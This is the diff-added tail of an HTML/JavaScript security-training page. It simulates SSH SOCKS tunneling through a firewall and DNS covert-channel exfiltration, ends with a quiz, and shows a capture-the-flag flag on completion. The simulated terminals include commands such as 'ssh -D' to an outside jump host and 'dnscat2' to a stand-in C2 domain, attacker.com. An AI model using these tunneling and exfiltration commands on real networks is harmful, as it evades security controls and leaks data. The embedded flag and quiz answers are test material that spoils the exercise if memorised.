+      <div style="font-family: var(--font-mono); font-size: 11px; color: var(--e-bright); letter-spacing: 0.15em; text-transform: uppercase; margin-bottom: 0.8rem; text-shadow: 0 0 8px rgba(16, 185, 129, 0.4);">
+        SYSTEM OVERRIDE SUCCESSFUL — MODULE 05 FLAG
+      </div>
+      <div class="flag-value" onclick="navigator.clipboard.writeText('sp3ctr3{dn5_tunn3l_55h_35c4p3_4rt15t}'); alert('Key copied to clipboard!')" title="Click to Copy">
+        sp3ctr3{dn5_tunn3l_55h_35c4p3_4rt15t}
+      </div>
+      <p style="font-size: 11px; color: var(--text-faint); margin-top: 1rem; margin-bottom: 0; font-family: var(--font-mono); letter-spacing: 0.05em;">
+        Click the container above to copy decrypted credentials to your clipboard.
+      </p>
+    </div>
+  </div>
+  <div style="height:6rem"></div>
+
+  <script>
+    const startTime=Date.now();
+    let quizCorrect=new Set();
+    let labDone=[false,false,false];
+    let currentTab=0;
+
+    function updateProgress(){  
+      const l=labDone.filter(Boolean).length/3;  
+      const q=quizCorrect.size/5;  
+      const pct=Math.round(Math.max(l,q)*100);  
+      document.getElementById('navFill').style.width=pct+'%';  
+      document.getElementById('navPct').textContent=pct+'%';  
+      document.getElementById('statLab').textContent=labDone.filter(Boolean).length+'/3';
+    }
+
+    function showLabTab(n){  
+      currentTab=n;  
+      [0,1,2].forEach(i=>{    
+        document.getElementById(`lp${i}`).style.display=i===n?'block':'none';    
+        document.getElementById(`lt${i}`).classList.toggle('active',i===n);  
+      });
+    }
+
+    // ═══ PHASE 0: FIREWALL ESCAPE ═══
+    const ports=[  
+      {num:22,service:'SSH — Secure Shell',status:'open'},  
+      {num:53,service:'DNS — Domain Name System',status:'open'},  
+      {num:80,service:'HTTP — Web Traffic',status:'blocked'},  
+      {num:443,service:'HTTPS — Encrypted Web',status:'blocked'},  
+      {num:3389,service:'RDP — Remote Desktop',status:'blocked'},  
+      {num:3306,service:'MySQL — Database',status:'blocked'},
+    ];
+    let tunnelActive=false;
+
+    function renderPortTable(){  
+      document.getElementById('portTableBody').innerHTML=ports.map(p=>`    
+        <tr class="${p.status}">      
+          <td>${p.num}</td>      
+          <td>${p.service}</td>      
+          <td><span class="port-status ${p.status}">${p.status==='open'?'OPEN':p.status==='blocked'?'BLOCKED':'TUNNELED'}</span></td>    
+        </tr>`).join('');
+    }
+
+    function renderFwDiagram(){  
+      document.getElementById('fwPipeRows').innerHTML=ports.map(p=>`    
+        <div class="fw-port-row ${tunnelActive&&p.status!=='blocked_always'?p.status==='blocked'?'tunneled':'allowed':p.status}">      
+          <span class="fw-port-num">:${p.num}</span>      
+          <span class="fw-port-name">${p.service.split('—')[0].trim()}</span>      
+          <span class="fw-port-status">${tunnelActive&&p.status==='blocked'?'TUNNELED':p.status.toUpperCase()}</span>    
+        </div>`).join('');
+    }
+
+    renderPortTable();
+    renderFwDiagram();
+
+    const fwCommandList=[  
+      {cmd:'nmap -p 22,53,80,443 localhost',desc:'Scan what ports are actually open',output:[    
+        {t:'faint',text:'# Confirm the firewall rules before attempting escape'},    
+        {t:'ok',text:'PORT    STATE   SERVICE'},    
+        {t:'ok',text:'22/tcp  open    ssh'},    
+        {t:'ok',text:'53/tcp  open    domain'},    
+        {t:'bad',text:'80/tcp  filtered http'},    
+        {t:'bad',text:'443/tcp filtered https'},    
+        {t:'bad',text:'Firewall confirmed: only 22 and 53 are open.'}  
+      ]},  
+      {cmd:'ssh -N -f -D 1080 user@jump.external.com',desc:'Create SOCKS5 proxy via SSH dynamic forwarding',output:[    
+        {t:'faint',text:'# -D 1080 = SOCKS5 proxy on local port 1080'},    
+        {t:'faint',text:'# -N = no remote commands (tunnel only)  -f = fork to background'},    
+        {t:'hi',text:'Warning: Permanently added jump.external.com to known hosts.'},    
+        {t:'ok',text:'SSH tunnel established — SOCKS5 proxy listening on 127.0.0.1:1080'},    
+        {t:'ok',text:'All traffic through proxy will exit via jump.external.com'}  
+      ]},  
+      {cmd:'curl --socks5 127.0.0.1:1080 https://example.com',desc:'Test: browse web through the SSH tunnel',output:[    
+        {t:'faint',text:'# Route curl through the SOCKS5 proxy — should bypass firewall entirely'},    
+        {t:'ok',text:'* SOCKS5 connection to 127.0.0.1:1080'},    
+        {t:'ok',text:'* Connected to example.com via jump.external.com'},    
+        {t:'hi',text:'HTTP/2 200 OK'},    
+        {t:'ok',text:'<!doctype html><html><head><title>Example Domain</title>...'},    
+        {t:'ok',text:'SUCCESS — HTTPS traffic tunneled through port 22. Firewall bypassed.'}  
+      ],tunnel:true},
+    ];
+
+    let fwCmdsDone=0;
+    
+    function renderFwCmds(){  
+      document.getElementById('fwCmds').innerHTML=fwCommandList.map((c,i)=>`    
+        <div class="cmd-chip" id="fwcmd-${i}" onclick="runFwCmd(${i})">      
+          <div><div class="cmd-code">$ ${c.cmd}</div><div class="cmd-desc">${c.desc}</div></div>      
+          <span style="color:var(--text-faint);font-size:18px;flex-shrink:0">▶</span>    
+        </div>`).join('');
+    }
+
+    function runFwCmd(i){  
+      document.getElementById(`fwcmd-${i}`).classList.add('used');  
+      const c=fwCommandList[i];  
+      const out=document.getElementById('fwOutput');  
+      out.innerHTML+=`<div class="term-line" style="margin-top:0.5rem"><span class="term-prompt">user@locked-network:~$</span><span class="term-cmd"> ${c.cmd}</span></div>`;  
+      c.output.forEach(o=>out.innerHTML+=`<span class="term-out ${o.t}">${o.text}</span>`);  
+      out.innerHTML+=`<div class="term-line" style="margin-top:4px"><span class="term-prompt">user@locked-network:~$</span><span class="term-cursor"></span></div>`;  
+      out.scrollTop=out.scrollHeight;  
+      
+      if(c.tunnel){    
+        tunnelActive=true;    
+        ports.forEach(p=>{if(p.status==='blocked') p.status='tunneled';});    
+        renderPortTable();
+        renderFwDiagram();    
+        document.getElementById('fwYouSub').textContent='Tunnel active';    
+        document.getElementById('fwOutsideSub').textContent='Reachable via SSH';    
+        document.getElementById('fwWallLabel').textContent='FIREWALL\nBYPASSED';    
+        document.getElementById('fwOutside').style.borderColor='var(--e)';  
+      }  
+      fwCmdsDone++;  
+      
+      if(fwCmdsDone===fwCommandList.length){    
+        labDone[0]=true;updateProgress();    
+        setTimeout(()=>{      
+          const r=document.getElementById('p0-result');r.style.display='block';      
+          r.innerHTML=`<div class="mission-complete"><div class="mc-head">✓ Phase 1 Complete — Firewall Escaped</div>      <p>Three commands. The firewall, which blocks ports 80, 443, 3389, and everything else, is completely irrelevant. All your traffic now travels encrypted through port 22 — the one port they trusted. The firewall sees one SSH session. You have full internet access through it. This is why Zero Trust Network Architecture exists.</p></div>`;      
+          r.scrollIntoView({behavior:'smooth',block:'center'});    
+        },400);  
+      }
+    }
+    
+    renderFwCmds();
+
+    // ═══ PHASE 1: TUNNEL VISUALISER ═══
+    const tvc=document.getElementById('tvisCanvas');
+    const tvx=tvc.getContext('2d');
+    let tvParticles=[],tvMode='tunnel',tvisDone=false;
+
+    function resizeTvis(){
+      tvc.width=tvc.offsetWidth;
+      tvc.height=200;
+    }
+    resizeTvis();
+    window.addEventListener('resize',resizeTvis);
+
+    function tvisMode(m){  
+      tvMode=m;  
+      if(!tvisDone){    
+        tvisDone=true;
+        labDone[1]=true;
+        updateProgress();    
+        setTimeout(()=>{      
+          const r=document.getElementById('p1-result');r.style.display='block';      
+          r.innerHTML=`<div class="mission-complete"><div class="mc-head">✓ Phase 2 Complete — Tunnel Visualised</div>      <p>The key insight: without the tunnel, HTTP packets hit the firewall and stop — red dots bouncing off the wall. With the SSH tunnel, everything is wrapped in the encrypted green pipe. The firewall sees only one green stream on port 22 with no visibility into its contents. Your HTTP requests ride invisibly inside.</p></div>`;      
+          r.scrollIntoView({behavior:'smooth',block:'center'});    
+        },800);  
+      }
+    }
+
+    function spawnTVParticle(){  
+      const isBlocked=tvMode==='blocked';  
+      const isBoth=tvMode==='both';  
+      tvParticles.push({    
+        x:20,y:isBoth?(Math.random()>0.5?tvc.height*0.3:tvc.height*0.7):tvc.height/2,    
+        vx:isBlocked?3:4,blocked:isBlocked||(isBoth&&Math.random()>0.5),    
+        color:isBlocked?'rgba(248,113,113,0.9)':'rgba(16,185,129,0.9)',    
+        inner:!isBlocked&&Math.random()>0.5?'rgba(96,165,250,0.7)':null,    
+        size:isBlocked?3:4,life:1  
+      });
+    }
+
+    function drawTvis(){  
+      tvx.clearRect(0,0,tvc.width,tvc.height);  
+      // firewall line  
+      const fwX=tvc.width*0.45;  
+      tvx.strokeStyle='rgba(248,113,113,0.3)';
+      tvx.lineWidth=2;
+      tvx.setLineDash([8,4]);  
+      tvx.beginPath();
+      tvx.moveTo(fwX,0);
+      tvx.lineTo(fwX,tvc.height);
+      tvx.stroke();  
+      tvx.setLineDash([]);  
+      tvx.font='10px JetBrains Mono';
+      tvx.fillStyle='rgba(248,113,113,0.5)';
+      tvx.textAlign='center';  
+      tvx.fillText('FIREWALL',fwX,14);  
+      // labels  
+      tvx.fillStyle='rgba(16,185,129,0.4)';
+      tvx.textAlign='left';
+      tvx.fillText('YOUR MACHINE',25,tvc.height-10);  
+      tvx.fillStyle='rgba(16,185,129,0.4)';
+      tvx.textAlign='right';
+      tvx.fillText('INTERNET',tvc.width-10,tvc.height-10);  
+      
+      // SSH tunnel pipe  
+      if(tvMode!=='blocked'){    
+        tvx.fillStyle='rgba(16,185,129,0.06)';
+        tvx.fillRect(0,tvc.height*0.35,tvc.width,tvc.height*0.3);    
+        tvx.strokeStyle='rgba(16,185,129,0.2)';
+        tvx.lineWidth=1;
+        tvx.setLineDash([]);    
+        tvx.beginPath();
+        tvx.moveTo(0,tvc.height*0.35);
+        tvx.lineTo(tvc.width,tvc.height*0.35);
+        tvx.stroke();    
+        tvx.beginPath();
+        tvx.moveTo(0,tvc.height*0.65);
+        tvx.lineTo(tvc.width,tvc.height*0.65);
+        tvx.stroke();    
+        tvx.fillStyle='rgba(16,185,129,0.15)';
+        tvx.font='9px JetBrains Mono';
+        tvx.textAlign='center';    
+        tvx.fillText('SSH ENCRYPTED TUNNEL (port 22)',tvc.width/2,tvc.height*0.5+3);  
+      }  
+      
+      if(Math.random()<0.5) spawnTVParticle();  
+      
+      tvParticles=tvParticles.filter(p=>{    
+        p.x+=p.vx;p.life-=0.008;    
+        const fwHit=p.blocked&&p.x>=fwX;    
+        if(fwHit){      
+          tvx.globalAlpha=0.7;      
+          tvx.beginPath();
+          tvx.arc(fwX,p.y,p.size+2,0,Math.PI*2);      
+          tvx.fillStyle='rgba(248,113,113,0.3)';
+          tvx.fill();      
+          return false;    
+        }    
+        tvx.globalAlpha=p.life;    
+        tvx.beginPath();
+        tvx.arc(p.x,p.y,p.size,0,Math.PI*2);
+        tvx.fillStyle=p.color;
+        tvx.fill();    
+        
+        if(p.inner&&!p.blocked){      
+          tvx.beginPath();
+          tvx.arc(p.x,p.y,p.size*0.5,0,Math.PI*2);
+          tvx.fillStyle=p.inner;
+          tvx.fill();    
+        }    
+        
+        tvx.globalAlpha=1;    
+        return p.life>0&&p.x<tvc.width;  
+      });  
+      requestAnimationFrame(drawTvis);
+    }
+    drawTvis();
+
+    // ═══ PHASE 2: DNS COVERT CHANNEL ═══
+    let encodedMsg='',exfilDone=false;
+
+    function encodeDNS(){  
+      const msg=document.getElementById('secretMsg').value.trim();  
+      if(!msg){return;}  
+      encodedMsg=msg;  
+      const b64=btoa(msg).replace(/=/g,'');  
+      const chunks=[];  
+      for(let i=0;i<b64.length;i+=12) chunks.push(b64.slice(i,i+12));  
+      const queries=chunks.map((c,i)=>`${c}.c${i}.secret.attacker.com`);  
+      const display=document.getElementById('dnsQueryDisplay');  
+      display.innerHTML=queries.map((q,i)=>`<span class="q-label">DNS TXT query ${i+1}: </span><span class="q-data">${q}</span><br>`).join('');  
+      document.getElementById('dnsIdsLog').innerHTML=    
+        `<span style="color:var(--e);">[IDS LOG]</span> <span style="color:var(--text-faint)">Detected ${queries.length} DNS TXT queries to attacker.com</span><br>`+    
+        `<span style="color:var(--text-faint)">Threat level: </span><span style="color:var(--e)">LOW</span><span style="color:var(--text-faint)"> — DNS traffic appears normal. No payload inspection.</span><br>`+    
+        `<span style="color:var(--text-faint)">Subdomains flagged: </span><span style="color:var(--amber)">unusual length (base64 pattern)</span><span style="color:var(--text-faint)"> — alert suppressed (below threshold)</span>`;  
+      document.getElementById('exfilBtn').style.display='inline-block';
+    }
+
+    function exfilData(){  
+      const dnsT=document.getElementById('dnsTerminal');
+      dnsT.style.display='block';  
+      const out=document.getElementById('dnsOutput');  
+      const b64=btoa(encodedMsg||'secret data');  
+      const chunks=[];  
+      for(let i=0;i<b64.length;i+=12) chunks.push(b64.slice(i,i+12));  
+      out.innerHTML=`<div class="term-line"><span class="term-prompt">user@locked-network:~$</span><span class="term-cmd"> dnscat2 --secret exfil_key attacker.com</span></div>`;  
+      
+      let step=0;  
+      const steps=[    
+        {t:'faint',text:'# dnscat2 — tunneling data over DNS queries — attacker.com is our C2 server'},    
+        {t:'hi',text:'Connecting to attacker.com (DNS)...'},    
+        {t:'ok',text:'Session established — bidirectional DNS tunnel active'},    
+        ...chunks.map((c,i)=>({t:'blue',text:`[TX] ${c}.c${i}.attacker.com → A query sent`})),    
+        {t:'ok',text:`[RX] Server acknowledged: "${encodedMsg||'secret data'}" received`},    
+        {t:'ok',text:'Exfiltration complete. IDS logged 0 security alerts.'},  
+      ];  
+      
+      const iv=setInterval(()=>{    
+        if(step<steps.length){      
+          const s=steps[step];
+          out.innerHTML+=`<span class="term-out ${s.t}">${s.text}</span>`;      
+          out.scrollTop=out.scrollHeight;
+          step++;    
+        } else {      
+          clearInterval(iv);
+          out.innerHTML+=`<div class="term-line" style="margin-top:4px"><span class="term-prompt">user@locked-network:~$</span><span class="term-cursor"></span></div>`;      
+          if(!labDone[2]){        
+            labDone[2]=true;updateProgress();        
+            setTimeout(()=>{          
+              const r=document.getElementById('p2-result');r.style.display='block';          
+              r.innerHTML=`<div class="mission-complete"><div class="mc-head">✓ Phase 3 Complete — DNS Covert Channel Used</div>          <p>The message "<code>${encodedMsg||'secret data'}</code>" was encoded into DNS subdomain queries and received by the attacker's C2 server — completely invisible to the IDS as anything other than slightly unusual DNS traffic. No TCP connection. No HTTP. No HTTPS. Just DNS queries to a domain the attacker controls. This is how real APT groups maintain persistent, covert communication channels in the most locked-down environments.</p></div>`;          
+              r.scrollIntoView({behavior:'smooth',block:'center'});        
+            },400);      
+          }    
+        }  
+      },120);
+    }
+
+    // ═══ QUIZ ═══
+    const quizData=[  
+      {q:'SSH dynamic port forwarding (-D) creates a SOCKS5 proxy on a local port. How does this allow an attacker or user to bypass firewall rules that block ports 80 and 443?',   opts:['It exploits a vulnerability in the firewall\'s SSH inspection engine to disable the blocking rules','All traffic directed through the SOCKS5 proxy is wrapped inside the SSH session on port 22 — the firewall sees only an encrypted SSH stream and has no visibility into the HTTP/HTTPS traffic tunneling through it','The -D flag sends a special TCP packet that temporarily opens blocked ports for 60 seconds','SOCKS5 proxies use a proprietary protocol that firewalls cannot classify and therefore allow by default'],   correct:1,explain:'SSH dynamic port forwarding creates a SOCKS5 proxy locally. When applications route traffic through this proxy, their connections are encapsulated inside the SSH session (which is encrypted and traverses port 22 — a typically allowed port). The firewall sees a single, long-running SSH connection on port 22 and has no visibility into what protocols are being tunneled inside it. From the firewall\'s perspective, nothing unusual is happening. The entire HTTP/HTTPS/RDP session is hidden within the encrypted SSH stream.'},  
+      {q:'WireGuard has only ~4,000 lines of code compared to OpenVPN\'s ~70,000+. Why does this matter from a security standpoint beyond just performance?',   opts:['Fewer lines means the software uses less RAM, leaving more resources for encryption operations','A smaller codebase has a dramatically reduced attack surface — fewer lines means fewer potential bugs, vulnerabilities, and code paths to audit. A security researcher can review the entire WireGuard codebase in hours; OpenVPN requires weeks','WireGuard uses simpler encryption algorithms that require less code to implement, making it fundamentally more secure','Fewer lines of code means WireGuard was more recently written and therefore uses more modern programming practices'],   correct:1,explain:'Code complexity directly correlates with attack surface. Every line of code is a potential vulnerability — a buffer overflow, a logic error, a cryptographic implementation mistake. With 70,000+ lines, OpenVPN has had numerous CVEs over its lifetime despite extensive auditing. WireGuard\'s 4,000 lines can be reviewed by a single experienced developer in a short time, and its narrow, well-defined cryptographic primitives (ChaCha20/Poly1305/Curve25519) were chosen specifically to be correct-by-design with minimal implementation complexity.'},  
+      {q:'DNS tunneling encodes data in DNS subdomain query strings (e.g., aGVsbG8=.c1.attacker.com). Why is this technique so difficult to block without causing collateral damage to legitimate network functions?',   opts:['DNS traffic is encrypted by default, making it impossible for firewalls to inspect the query content','DNS is required for almost all internet functionality — blocking DNS entirely breaks everything. Blocking specific domains is ineffective because attackers use their own domains. Inspecting DNS content requires deep packet inspection that most network equipment doesn\'t perform by default','DNS tunneling uses a zero-day vulnerability in DNS server software that cannot be patched without breaking DNS','DNS queries use UDP which firewalls cannot inspect, unlike TCP-based protocols'],   correct:1,explain:'DNS creates a dilemma for defenders: it is so fundamental to network operation that it cannot be blocked wholesale, yet it is an open, largely uninspected channel. Attackers control their own authoritative DNS servers, so domain blacklisting is ineffective — they simply register new domains. Most firewalls allow DNS traffic by default and perform no content inspection beyond protocol conformance. Effective detection requires DNS analytics (unusual subdomain lengths, high query frequency, TXT/NULL record usage) rather than simple blocking, and most organisations lack this capability.'},  
+      {q:'Remote SSH port forwarding (-R) is particularly valuable for attackers who have compromised an internal machine behind a firewall. What specific firewall bypass does it enable that direct connections cannot?',   opts:['It opens inbound ports on the target firewall by sending specially crafted ICMP packets','The compromised internal machine initiates an outbound SSH connection (which firewalls typically allow), then the -R flag creates a reverse tunnel — anyone connecting to a port on the external server gets forwarded back through the tunnel to the internal machine, bypassing inbound firewall rules entirely','Remote port forwarding exploits the fact that firewalls cannot track SSH session states','It allows the attacker to temporarily disable firewall rules on the internal machine'],   correct:1,explain:'Firewalls that block inbound connections are specifically designed to prevent attackers from reaching internal machines from outside. Remote port forwarding (-R) circumvents this by reversing the direction of connection establishment: the compromised internal machine makes an outbound SSH connection (which the firewall permits), and the -R flag creates a listening port on the external server. When an attacker connects to that external port, the connection is forwarded back through the already-established SSH tunnel to the internal machine. The firewall never sees an inbound connection — only the original outbound SSH session that it approved.'},  
+      {q:'Zero Trust Network Architecture operates on the principle of "never trust, always verify." How does this specifically neutralise the threat of SSH tunneling attacks demonstrated in this module\'s lab?',   opts:['Zero Trust blocks all SSH connections, making port forwarding impossible','Zero Trust uses end-to-end encryption that prevents SSH tunnels from encapsulating other protocols','In a Zero Trust model, reaching "the internal network" via an SSH tunnel provides no value — each application requires separate identity verification, device posture checks, and access decisions. There is no trusted interior to exploit; a tunnel gets you to a policy enforcement point, not to resources','Zero Trust detects SSH tunneling using deep packet inspection and automatically terminates suspicious sessions'],   correct:2,explain:'The SSH tunneling lab worked because reaching the internal network implied access to internal resources — the firewall\'s trust model was binary. Zero Trust eliminates this entirely. Even if an attacker successfully establishes an SSH tunnel into the "network," every application they attempt to reach requires its own authentication (user identity + MFA), device posture verification (is this a managed device?), and authorisation decision. There is no interior to exploit through lateral movement — each resource is individually gated. The tunnel reaches a policy enforcement point that will deny access because the attacker cannot satisfy per-resource authentication requirements.'  }
+    ];
+
+    function renderQuiz(){  
+      document.getElementById('quizQuestions').innerHTML=quizData.map((q,qi)=>`    
+        <div class="quiz-q" id="qq-${qi}">      
+          <div class="quiz-q-text">${qi+1}. ${q.q}</div>      
+          <div class="quiz-options">${q.opts.map((o,oi)=>`        
+            <div class="quiz-option" id="qo-${qi}-${oi}" onclick="answerQuiz(${qi},${oi})">          
+              <div class="quiz-opt-key">${'ABCD'[oi]}</div>${o}</div>`).join('')}      
+          </div>      
+          <div class="quiz-explain" id="qe-${qi}">${q.explain}</div>    
+        </div>`).join('');
+    }
+
+    function answerQuiz(qi,oi){  
+      if(quizCorrect.has(qi))return;  
+      const q=quizData[qi];  
+      document.querySelectorAll(`[id^="qo-${qi}-"]`).forEach(el=>el.style.pointerEvents='none');  
+      document.getElementById(`qo-${qi}-${oi}`).classList.add(oi===q.correct?'correct':'wrong');  
+      document.getElementById(`qo-${qi}-${q.correct}`).classList.add('correct');  
+      document.getElementById(`qe-${qi}`).classList.add('show');  
+      if(oi===q.correct){quizCorrect.add(qi);updateQuizScore();}
+    }
+
+    function updateQuizScore(){  
+      document.getElementById('quizScore').textContent=`${quizCorrect.size} / 5 correct`;  
+      if(quizCorrect.size===5)setTimeout(showCompletion,600);
+    }
+
+    function showCompletion(){  
+      const mins=Math.max(1,Math.round((Date.now()-startTime)/60000));  
+      document.getElementById('statTime').textContent=mins;  
+      const c=document.getElementById('completion');  
+      c.style.display='flex';  
+      setTimeout(()=>c.classList.add('visible'),50);  
+      document.getElementById('navFill').style.width='100%';  
+      document.getElementById('navPct').textContent='100%';  
+      setTimeout(() => {
+        const flagCard = c.querySelector('.futuristic-flag-card');
+        if (flagCard) {
+          flagCard.scrollIntoView({behavior:'smooth',block:'center'});
+        } else {
+          c.scrollIntoView({behavior:'smooth',block:'start'});
+        }
+      }, 300);
+    }
+
+    renderQuiz();
+    updateProgress();
+  </script>
+</body>
+</html>
